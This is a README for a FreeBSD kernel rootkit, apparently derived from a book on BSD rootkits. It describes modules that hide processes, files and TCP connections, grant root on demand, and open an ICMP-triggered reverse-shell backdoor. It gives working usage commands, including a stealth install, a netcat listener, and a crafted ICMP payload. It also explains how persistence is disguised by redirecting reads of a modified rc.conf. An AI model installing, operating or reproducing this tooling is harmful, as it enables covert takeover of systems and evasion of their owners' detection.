# kld-rootkit
## A collection of FreeBSD 14.1 rootkit kernel modules and utilities

**TL;DR ./install_rootkit.sh -s**

This rootkit was developed and tested on FreeBSD 14.1-RELEASE. It is a
collection of kernel modules and utilities derived from the examples in
Joseph Kong's excellent book [DESIGNING BSD ROOTKITS](https://nostarch.com/rootkits.htm), which I highly encourage
anyone with interest in kernel programming to read.

This rootkit provides functionality for process hiding, file hiding, kernel
module hiding, file redirection, on-demand privilege escalation, backdoor
capability, and persistence.

## Kernel Modules

The table below contains the names and descriptions of the kernel modules contained
in this rootkit:
| Kernel Module | Description |
| -------------- | ----------- |
| shdw_sysent_tbl | Lookup table stored in kernel space which contains a mapping of system call numbers and functions that have been hooked. Used to assist with altering and restoring the real sysent table. |
| shdw_lookup | System call to look up syscall numbers in the shadow sysent table. Used to find the syscall numbers that are part of the rootkit. |
| deepbg | System call to hide a running process and it's children. |
| stash | getdirentries system call hook. Used to hide files that have a "magic word" in their filename. |
| knighted | System call to give the calling process root privileges. |
| whisper | System call to hide an open TCP connection. |
| file_redirection | open system call hook. Used to open a file with a "magic word" extension, if it exists, in place of the given filename. |
| order_66 | A backdoor icmp_input hook that is triggered whenever a specially crafted ICMP packet is received. |
| kmalloc | Technically, not part of the rootkit. It is compiled to produce byte code for allocating kernel memory and to demonstrate the run-time kernel memory patching technique from the book. |

## Utilities
The table below contains the names and descriptions of user space tools included in the
rootkit:
| Utility | Description |
| ------- | ----------- |
| interface-lookup | Look up syscall numbers associated with the rootkit's capabilities. |
| knight-me | Uses the knighted system call to drop the user into a rootshell. |
| interface-deepbg | Uses the deepbg system call to hide a running process and it's direct children. |
| interface-whisper | Uses the whisper system call to hide an open TCP connection. |
| loader | Works in conjunction with stash and file_redirection to replace a file with a trojan without altering the file's access and modification times. The machine code in this program is specific to the amd64 architecture. Depending on architecture, compiler, compile flags, etc, it may need modification to be compatible with the target kernel. |
| trigger | Used with the order_66 backdoor and a listener like netcat (nc) to make a reverse shell connection. |

## Miscellaneous
The table below contains the names and descriptions of demonstration programs which are not part of the core rootkit,
but were included as examples of various other techniques from the book:
| Utility | Description |
| ------- | ----------- |
| interface-kmalloc | User space program that demonstrates using modfind to locate the kmalloc syscall and then invokes it allocate kernel memory. |
| kvm-write | User space program that demonstrates using kvm (kernel memory interface) to write to kernel memory. |
| test-kmalloc-patch | User space program which demonstrates run-time kernel memory patching to allocate kernel memory. The machine code in this program is specific to the amd64 architecture. Depending on architecture, compiler, compile flags, etc, it may need modification to be compatible with the target kernel. |

## How to Install

If kernel sources are in a non-standard location (i.e. other than /usr/src/sys)
set the SYSDIR environment variable to the location of the "sys" directory in
your kernel source tree.

Run the "install_rootkit.sh" script located in the top level directory of this repo as root.

Use the "-s" option to install in stealth mode which will avoid printing debug
messages to the system log and will employ the kernel module hiding and
persistence capabilities.

    ./install_rootkit.sh -s

Running the script without the "-s" option will basically install the rootkit
in test mode. Debug messages will be written to the console and system log.
No attempt to hide the kernel modules or achieve persistence will be made.

    ./install_rootkit.sh

An optional argument for the "magic word" can be used as well. This string
is used as a password to activate some features in this rootkit such as the
order_66 backdoor and knighted rootshell. This string can also be used as
part of a file's name to use the file hiding and redirection capabilities.

    ./install_rootkit.sh -s z4xX0n

The default "magic word" is "z4xX0n" and will be used in the rest of the examples in this document.

## How to Use

As part of the installation, rootkit utilities will be built and can be found under the top level directory of this repo, in the bin subdirectory.

### Lookup Syscall Numbers

Use the interface-lookup utility to get the system call numbers of this rootkit. An optional system call number of the shdw_lookup system call can also be passed as an argument.

    $ ./bin/interface-lookup 210
    [-] lookup syscall number   = 210
    [-] deepbg syscall number   = 211
    [-] knighted syscall number = 213
    [-] whisper syscall number  = 212

### Process Hiding

Use the deepbg system call to hide a running process. It takes a PID number as an argument and will hide that process and it's direct children by removing them from the allproc and hash lists.

To test on a process with PID 1234, run:

    ./bin/interface-deepbg 211 1234

### File Hiding

Any file with the "magic word" in its filename will not appear in a directory or wildcard listing. If the file's exact name is given, it will be listed.

### File Redirection

If a file with the "magic word" as it's extension exists, the file with the extension is opened in place of the file without the extension.

    e.g. Opening /tmp/file would actually open /tmp/file.z4xX0n if both of those files existed.

### On-Demand Privilege Escalation

Use the knighted system call with the knight-me utility to gain effective user ID 0.

To test with the default "magic word":

    ./bin/knight-me 213 z4xX0n

### TCP Connection Hiding

Use the whisper system call to hide an open TCP connection. 

To test hiding an ssh connection to the local port 22 from a foreign port 12345:

    ./bin/interface-whisper 212 22 12345

### Backdoor

To trigger the order_66 backdoor icmp_input hook we need to send an ICMP packet that:
 
 1. Is of type ICMP_REDIRECT
 2. Has code ICMP_REDIRECT_TOSHOST
 3. Has the "magic word" at the beginning of it's data buffer
 4. The internet address of a listener
 5. The port that the listener is on
 
netcat (nc) can be used to listen for the inbound connection

For a reverse shell to our target running the order_66 kernel module on *192.168.1.123* start a listener with netcat on *192.168.1.250* and port *5555*

    nc -lnvp 5555

To activate the backdoor from any FreeBSD system, run the trigger program:

    ./bin/trigger 192.168.1.123 192.168.1.250 5555 z4xX0n

From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt

Alternatively, perl can be used to craft the packet's data buffer and [ nemesis ](https://github.com/libnet/nemesis) can be used to craft the ICMP packet with the necessary type, code, and data payload

#### Example:

From anywhere run:

    echo "z4xX0n" > /tmp/payload
    perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
    nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123

From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt

### Persistence

Persistence through reboot is achieved by creating a copy of the */etc/defaults/rc.conf* file. The copy is modified to automatically load the rootkit's kernel modules during system initialization. The *loader* utility is then used to copy the original file to */etc/defaults/rc.conf.z4xX0n* and overwrite the original file with the altered contents without changing the last access or modification times of the file. This way once the kernel modules are loaded, it will look as if the */etc/defaults/rc.conf* file has not been changed. Opening and viewing the *rc.conf* file will redirect to the unaltered original copy with the "magic word" extension.
  
## Disable the Rootkit
  
To disable the rootkit after installing in test mode, run the "kldloadall.sh" script located in the top level directory of this repo with the "-u" option.

    ./kldloadall.sh -u
  
To disable the rootkit after installing in stealth mode, boot into single user mode and update the default rc.conf file. See the following example for a zfs file system:
  
    zfs set readonly=off zroot
    zfs mount -a
    cp -f /etc/defaults/rc.conf.z4xX0n /etc/defaults/rc.conf
    exit
